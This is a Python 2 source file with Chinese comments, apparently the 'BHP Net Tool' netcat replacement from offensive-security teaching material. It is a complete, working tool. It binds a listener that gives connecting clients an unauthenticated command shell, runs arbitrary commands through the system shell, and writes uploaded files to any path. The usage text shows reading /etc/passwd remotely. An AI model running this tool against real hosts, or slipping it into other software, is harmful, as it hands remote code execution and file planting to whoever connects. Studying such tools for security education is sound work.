#!/usr/bin/python
#-*- coding:utf8 -*-
import sys
import socket
import getopt
import threading
import subprocess

#全域變數
listen =  False
command =  False
upload =  False
execute =  ""
target =  ""
upload_destination =  ""
port =  0

def  usage ():
    print  " BHP Net Tool "
    print
    print  " 用法: bhpnet.py -t target_host  -p port "
    print  " -l --listen - 在 [host]:[port] 監聽連線 "
    print  " -e --execute = file_to_run - 接到連線時執行指定檔案 "
    print  " -c --command - 啟動命令列 shell "
    print  " -u --upload=destination - 接到連線時上傳檔案並寫出 [destination]"
    print
    print
    print  " 範例: "
    print  " bhpnet.py -t 192.168.0.1 -p 5555 -l -c "
    print  r" bhpnet.py -t 192.168.0.1 -p 5555 -l -u c:\\ target.exe "
    print  " bhpnet.py -t 192.168.0.1 -p 5555 -l -e \"cat /etc/passwd\" "
    print  " echo 'ABCDEFGHI' | python ./bhpnet.py -t 192.168.11.12 -p 135 "
    sys.exit( 0 )

def  main ():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if  not   len (sys.argv[ 1 :]):
        usage()


    # 讀取命令行選項,若沒有該選項 則顯示用法
    try :
        opts, args = getopt.getopt(sys.argv[ 1 :], " hle:t:p:cu: " ,[ "help" , "listen" , "execute" , "target" , "port" , "command" , "upload" ])
    except getopt.GetoptError as err:
        print  str (err)
        usage()


    for o,a in opts:
        if o in ( "-h" , "--help" ):
            usage()
        elif o in ( "-l" , "--listen" ):
            listen =  True
        elif o in ( "-e" , "--execute" ):
            execute = a
        elif o in ( "-c" , "--commandshell" ):
            command =  True
        elif o in ( "-u" , "--upload" ):
            upload_destination = a
            print a
        elif o in ( "-t" , "--target" ):
            target = a
        elif o in ( "-p" , "--port" ):
            port =  int (a)
        else :
            assert  False , "Unhandled Option"

    #我們要監聽 還是 僅從 stdin 讀取並發送數據？

    # 我們開始監聽 可以準備上傳文件,執行命令,提供shell 等
    if listen:
        server_loop()
    
    if  not listen and  len (target) and port >  0 :
        print "如果沒有要透過 stdin 發送數據時 要按 CTRL-D"
        # 從命令行讀取內存數據
        # 這裡會 block ,所以如果沒有要透過 stdin 發送數據時 要按 CTRL-D
        buffer = sys.stdin.read() 
        # 發送數據
        client_sender(buffer)



def  client_sender( buffer ): #傳送data後 還可以接收 或是 繼續傳送

    #TCP client
    client = socket.socket(socket. AF_INET , socket. SOCK_STREAM )

    try :
        #連接到目標主機
        client.connect((target, port))

        if  len (buffer):
            client.send(buffer)

        while  True :
            
            #等待回傳
            recv_len =  1
            response =  ""

            while recv_len:
                data = client.recv( 4096 )
                recv_len =  len (data)
                response += data

                if recv_len <  4096 :
                    break

            print   response

            # 等待更多的輸入
            buffer =  raw_input ( "" )
            #這是為了方便 command 的應用 所以自動加了 \n
            buffer +=  "\n"

            # 發送出去
            client.send(buffer)

    except :
        print  " [*] Exception! Exiting. "

    #關閉連接
    client.close()

def  server_loop ():
    global target

    # 如果沒有定義目標,那我們監聽所有接口
    if  not  len (target):
        target =  "0.0.0.0"

    server = socket.socket(socket. AF_INET , socket. SOCK_STREAM)
    server.bind((target, port))

    server.listen( 5 )

    while  True :
        client_socket, addr = server.accept()
        # 啟動一個 Thread 處理新的客戶端
        client_thread = threading.Thread(target = client_handler, args = (client_socket,))
        client_thread.start()

def  client_handler ( client_socket ):
    global upload
    global execute
    global command


    # 檢查上傳文件
    if  len (upload_destination):
        
        # 讀取所有的 bytes 並寫到指定位置
        file_buffer =  ""
        
        # 持續讀取數據直到沒有符合的數據
        while  True :
            data = client_socket.recv( 1024 )

            if  not data:
                break
            else :
                file_buffer += data

        try :
            file_descriptor =  open (upload_destination, " wb " )
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            client_socket.send( " Successfully saved file to %s \r\n "  % upload_destination)
        except :
            client_socket.send( " Failed to save file to %s \r\n "  % upload_destination)

    # 檢查命令
    if  len (execute):
        # 執行命令
        output = run_command(execute)
        client_socket.send(output)


    # 如果需要shell,那麼我們進入另一個迴圈
    if command:
        while  True :
            # 簡單的提示
            client_socket.send( " <BHP:#> " )

            cmd_buffer =  ""
            while  "\n"  not  in cmd_buffer:
                cmd_buffer += client_socket.recv( 1024 )
            # 取得命令輸出
            response = run_command(cmd_buffer)
            # 回傳
            client_socket.send(response)


def  run_command ( command ):

    # 刪除字符串末尾的空格
    command = command.rstrip()
    # 執行命令並取回輸出
    try :
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell= True )
    except :
        output =  " Failed to execute command. \r\n "
    # 將輸出回傳
    return output

#調用main函數
main()

